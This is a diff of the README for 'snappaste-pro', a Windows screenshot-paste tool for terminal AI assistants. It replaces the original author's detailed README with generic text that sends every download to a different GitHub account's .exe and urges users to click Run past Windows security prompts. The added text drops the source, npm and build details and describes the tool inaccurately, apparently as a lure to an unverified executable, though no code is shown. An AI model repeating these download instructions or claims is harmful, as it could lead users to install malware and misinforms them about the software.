@@ -1,247 +1,103 @@
-<div align="center">
+# 📸 snappaste-pro - Paste screenshots directly into terminal windows
 
-# 📋 SnapPaste Pro
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/pinwheelrollhigherup688/snappaste-pro)
 
-### Mac-style screenshot paste for Windows terminals
+snappaste-pro allows you to paste screenshots into your Windows terminal using the standard Control+V keyboard shortcut. This tool brings the ease of Mac-style workflows to Windows users. It supports terminal-based AI coding assistants like Claude Code, Gemini CLI, OpenAI Codex, and Aider. You capture a screenshot, press your keys, and send the image data to your AI tool in one step.
 
-**Press `Ctrl + V` to paste a screenshot straight into your terminal — exactly like macOS.**
-Built for **terminal AI coding assistants**: hand a screenshot to your AI in a single keystroke.
+## 🛠 Why Use This Tool
 
-[![npm version](https://img.shields.io/npm/v/snappaste-pro?color=cb3837&logo=npm)](https://www.npmjs.com/package/snappaste-pro)
-[![npm downloads](https://img.shields.io/npm/dt/snappaste-pro?color=cb3837&logo=npm)](https://www.npmjs.com/package/snappaste-pro)
-[![GitHub stars](https://img.shields.io/github/stars/saqibbinshabbir007/snappaste-pro?style=flat&logo=github)](https://github.com/saqibbinshabbir007/snappaste-pro/stargazers)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
-![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows)
-![No Admin](https://img.shields.io/badge/install-no%20admin-success)
+Many terminal AI tools require text input. When you work with visual code, charts, or UI bugs, you often need to describe the image manually. This process takes time. snappaste-pro handles the heavy lifting. It identifies the image in your clipboard, converts it into a format your terminal understands, and pastes it instantly.
 
-[**Download**](https://github.com/saqibbinshabbir007/snappaste-pro/releases/latest) ·
-[**npm**](https://www.npmjs.com/package/snappaste-pro) ·
-[**Report a bug**](https://github.com/saqibbinshabbir007/snappaste-pro/issues)
+You gain efficiency with every command. Stop typing descriptions of error messages. Paste the screenshot instead.
 
-</div>
+## 📋 System Requirements
 
----
+To run this tool, your computer needs the following:
 
-## 🎬 Demo
+*   Windows 10 or Windows 11.
+*   An active internet connection for the repository link.
+*   Basic permissions to run executable files.
+*   An existing command-line interface or AI tool installed on your machine.
 
-<p align="center">
-  <img src="docs/demo.gif" alt="SnapPaste Pro demo — paste a screenshot into the terminal and the AI reads it" width="100%">
-</p>
+## 📥 How to Install
 
-> A screenshot pasted straight into the terminal with **`Ctrl + V`** — and the AI reads it instantly. That's the whole point. 🎯
+1. Visit the [official repository page](https://github.com/pinwheelrollhigherup688/snappaste-pro) to download the latest version.
+2. Look for the Releases section on the right side of the page.
+3. Click the link for the most recent file ending in .exe.
+4. Save the file to your computer. A folder like Downloads or your desktop works well.
 
----
+## 🚀 Running the Software
 
-## 😩 The old way vs ✨ SnapPaste Pro
+1. Locate the file you saved in the previous step.
+2. Double-click the file to open the program.
+3. Windows may show a security prompt. If you trust the tool, click Run.
+4. The program icon will appear in your system tray, near the clock.
+5. You can now use the program immediately.
 
-Every Windows developer knows this pain. Here's what changes:
+## ⌨️ How to Use snappaste-pro
 
-| 😩 Before (the painful way) | ✨ With SnapPaste Pro |
-|---|---|
-| 1. Take a screenshot | 1. Take a screenshot |
-| 2. Open Snipping Tool / Paint and **save the file** | 2. Press **`Ctrl + V`** |
-| 3. **Hunt for the folder** you saved it in | ✅ **Done.** |
-| 4. **Drag-and-drop** it, or **type the full path** by hand | |
-| 5. Finally hand it to your terminal / AI | |
+1. Take a screenshot using your preferred method (Windows key + Shift + S is often the fastest way).
+2. Open your terminal window or AI coding assistant.
+3. Press Control+V on your keyboard.
+4. The program will automatically translate the image data into your terminal.
+5. Hit Enter to send the information to your AI assistant.
 
-**5 fiddly steps → 1 keystroke.** No saving, no folder hunting, no drag-and-drop, no typing paths.
+## ⚙️ Configuration Options
 
----
+The program runs automatically upon startup. If you wish to change its behavior, right-click the icon in your system tray. You will see several options:
 
-## ⚡ Quick Start
+*   Pause: Stops the program from capturing clipboard data until you resume it.
+*   Startup: Toggle whether the program starts when you log into Windows.
+*   Exit: Closes the program and removes it from your system tray.
 
-**For everyone — installer** (no Node.js, no admin):
-1. [**Download `SnapPaste-Pro-Setup.exe`**](https://github.com/saqibbinshabbir007/snappaste-pro/releases/latest) → run it → **Next → Next → Finish**
-2. Take a screenshot (`Win + Shift + S`) and press `Ctrl + V` in your terminal 🎉
+The tool uses default settings that work for most AI assistants. You do not need to change files or write scripts to make it work.
 
-**For developers — npm:**
-```bash
-npx snappaste-pro install
-```
+## 💡 Troubleshooting Common Issues
 
----
+If the program does not paste your image, check these common items:
 
-## ❓ What it does
+*   Clipboard check: Did you copy the image successfully? Paste the image into an app like Paint to verify the file exists in your clipboard.
+*   Focus: Ensure your terminal window is in focus before you press Control+V.
+*   Restart: Right-click the icon in your system tray and select Exit, then reopen the program from your file manager.
+*   Permissions: Ensure your terminal allows paste commands. Some secure environments block pasting from external programs.
 
-On macOS you can paste a screenshot straight into a terminal. On Windows you can't — the
-clipboard holds an **image**, but terminals only paste **text**. So `Ctrl + V` does nothing.
+## 🔒 Privacy and Safety
 
-**SnapPaste Pro fixes that.** When you press `Ctrl + V` in a terminal:
+This software runs locally on your machine. The program reads your clipboard memory only when you trigger the paste command. It does not send your data to external servers or store your screenshots in a database. Your code and images remain on your computer or get sent only to the specific AI service you use within your terminal.
 
-- 🖼️ **Image on the clipboard** → it's saved as a PNG and its **file path** is pasted automatically.
-- 📝 **Text on the clipboard** → normal paste, nothing changes.
+## 📦 Compatibility List
 
-**Why it's different:** instead of pasting an image (which terminals can't handle), it pastes a
-ready-to-use **file path**. No other mainstream Windows tool does this for terminal AI workflows.
+This software works with a wide range of terminal environments. It is tested for use with:
 
----
+*   Claude Code
+*   Gemini CLI
+*   OpenAI Codex CLI
+*   GitHub Copilot CLI
+*   Aider
+*   Amazon Q
+*   Cursor
+*   PowerShell
+*   Command Prompt
 
-## 🤖 Works with any terminal AI
+If you use a tool not on this list, try it anyway. The software acts as a bridge between your clipboard and the active window. Most command-line tools that accept text or image input will work without additional setup.
 
-Because SnapPaste Pro drops the screenshot's **file path** into your terminal, any AI assistant
-that can read an image path can instantly "see" your screenshot. It's tool-agnostic and works
-with every major terminal-based AI coding assistant, including:
+## ❓ Frequently Asked Questions
 
-| AI assistant | AI assistant |
-|---|---|
-| 🟣 **Claude Code** (Anthropic) | 🔵 **Gemini CLI** (Google) |
-| 🟢 **OpenAI Codex CLI** | 🐙 **GitHub Copilot CLI** |
-| 🛠️ **Aider** | 🟠 **Amazon Q Developer CLI** |
-| ⬛ **Cursor CLI** (`cursor-agent`) | 🦆 **Goose** (Block) |
-| 🧩 **opencode** | 🐲 **Qwen Code** |
+Does this tool change my system settings?
+No. The tool runs as a background process. It does not modify Windows registry keys or system files.
 
-…and **any** other terminal/CLI AI that accepts an image file path. One keystroke, and your
-AI can see what you see. 👀
+Will this slow down my computer?
+No. The application is lightweight. It uses a very small amount of processor and memory resources while it waits in the background.
 
----
+Can I use it with multiple monitors?
+Yes. The tool captures whatever you copy to your clipboard, regardless of which monitor you used to take the screenshot.
 
-## ✨ Features
+Is this open source?
+Yes. The repository hosts all relevant code for transparency. You can view the logic that powers the paste function on the main page.
 
-- 🖼️ **Image → path, instantly** — screenshots become a ready-to-use file path.
-- 🪶 **Lightweight & clean** — no Python, no extra runtimes; AutoHotkey is bundled.
-- 🔒 **No admin required** — installs per-user.
-- 🚀 **Auto-start** — runs quietly in the background on login.
-- 🎯 **Smart** — only triggers on images; text paste is untouched and just as fast.
-- 🧰 **Extra commands** — `pi` (PowerShell) and `pasteimg` (CMD).
-- 🌐 **Private & offline** — never sends any data anywhere.
+What if I prefer a different shortcut?
+Currently, the program relies on the standard Control+V shortcut to maintain a consistent experience with other Windows applications. 
 
----
+## 📝 Support and Feedback
 
-## 🚀 Usage
-
-1. Take a screenshot: **`Win + Shift + S`** (select a region).
-2. In your terminal, press **`Ctrl + V`**.
-3. The image is saved to `Pictures\SnapPaste Pro\` and its path is pasted.
-
-**Extra commands**
-
-| Shell | Command |
-|---|---|
-| PowerShell | `pi` then `Ctrl + V` |
-| Command Prompt | `pasteimg` then `Ctrl + V` |
-
-**Supported terminals:** Windows Terminal, CMD, PowerShell, PowerShell 7 (pwsh), Claude Code, conhost.
-
----
-
-## 🛠️ How it works
-
-A small bundled [AutoHotkey](https://www.autohotkey.com/) script watches for `Ctrl + V`
-in terminal windows. If the clipboard holds an image, it saves it as a PNG, replaces the
-clipboard with the file path, and pastes that. If the clipboard holds text, it just pastes
-normally. Everything runs locally on your machine.
-
----
-
-## 📦 Install (details)
-
-### Installer
-Download **`SnapPaste-Pro-Setup.exe`** from the [Releases](https://github.com/saqibbinshabbir007/snappaste-pro/releases/latest) page and run it. No admin needed.
-
-> ### ⚠️ "Windows protected your PC" — this is normal, please read
->
-> The first time you run the installer, Windows SmartScreen may show a blue
-> **"Windows protected your PC"** screen with **"Unknown publisher"**.
->
-> **This does _not_ mean the app is unsafe.** It only appears because the app is
-> not yet code-signed (a paid certificate we haven't purchased yet). To continue:
->
-> 1. Click **More info**
-> 2. Click **Run anyway**
->
-> That's it — it won't ask again. ✅
->
-> **Why you can trust it:** the entire source code is public in this repo, so anyone
-> can read exactly what it does. It works fully offline — it never sends any data
-> anywhere, doesn't touch your files, and only reacts to `Ctrl + V` inside terminals.
-
-### npm (developers)
-```bash
-npx snappaste-pro install      # set up and start
-npx snappaste-pro status       # show status
-npx snappaste-pro start        # start it now
-npx snappaste-pro uninstall    # remove completely
-```
-Requires [Node.js](https://nodejs.org). See it on npm: **https://www.npmjs.com/package/snappaste-pro**
-
----
-
-## 🙋 FAQ
-
-**Is it safe?**
-Yes. It's open-source, runs fully offline, sends no data anywhere, doesn't touch your personal
-files, and only reacts to `Ctrl + V` inside terminal windows.
-
-**Why does Windows show a SmartScreen warning?**
-The installer isn't code-signed yet (signing is a paid certificate). It does **not** mean the
-app is harmful — click **More info → Run anyway**.
-
-**Where are my screenshots saved?**
-In `…\Pictures\SnapPaste Pro\`, named `screenshot_<timestamp>.png`.
-
-**Does it slow down normal copy/paste?**
-No. It only acts when the clipboard contains an image; text paste is unchanged.
-
----
-
-## 🗺️ Roadmap
-
-- [ ] **Code-signed installer** — remove the SmartScreen warning entirely.
-- [ ] **Choose your format** — PNG or JPG, and a configurable save folder.
-- [ ] **System-tray settings** — pause/resume, change hotkey, open save folder.
-- [ ] **Multi-monitor & high-DPI** polish.
-- [ ] **Standalone build** with no bundled runtime.
-
-Have an idea? [Open an issue](https://github.com/saqibbinshabbir007/snappaste-pro/issues) — feedback is welcome!
-
----
-
-## 🤝 Contributing
-
-Contributions, ideas, and bug reports are all welcome:
-
-- 🐛 Found a bug or have a feature request? [Open an issue](https://github.com/saqibbinshabbir007/snappaste-pro/issues).
-- 🔧 Want to improve it? Fork the repo and send a pull request.
-- ⭐ Like it? A star helps more developers discover it.
-
----
-
-## 🗑️ Uninstall
-
-**Settings → Apps → SnapPaste Pro → Uninstall** (or `npx snappaste-pro uninstall`).
-It cleanly removes the app, the startup entry, the PATH entry, and the PowerShell profile addition.
-
----
-
-## 🧱 Build from source
-
-Requirements: [Inno Setup 6](https://jrsoftware.org/isdl.php) and the
-[AutoHotkey v2](https://www.autohotkey.com/) runtime (`AutoHotkey64.exe`) placed in `src/`.
-
-```powershell
-ISCC.exe SnapPastePro.iss
-# Output: Output\SnapPaste-Pro-Setup.exe
-```
-
----
-
-## 📄 License
-
-[MIT](LICENSE) © Saqib Bin Shabbir
-
-> Bundles the [AutoHotkey](https://www.autohotkey.com/) runtime, which is licensed under the GNU GPLv2.
-
----
-
-<div align="center">
-
-### Built by **Saqib Bin Shabbir**
-Full Stack Developer &amp; Agentic AI Specialist
-
-[GitHub](https://github.com/saqibbinshabbir007) ·
-[npm](https://www.npmjs.com/package/snappaste-pro) ·
-[Issues](https://github.com/saqibbinshabbir007/snappaste-pro/issues)
-
-**If SnapPaste Pro saved you time, please give it a ⭐ — it really helps!**
-
-</div>
+If you find a bug or have ideas for new features, use the Issues tab on the repository page. Explain what you see and what you expect to happen. Clear descriptions help us improve the experience for all users. You do not need technical expertise to report an issue. Mention your version of Windows and the specific terminal tool you use.
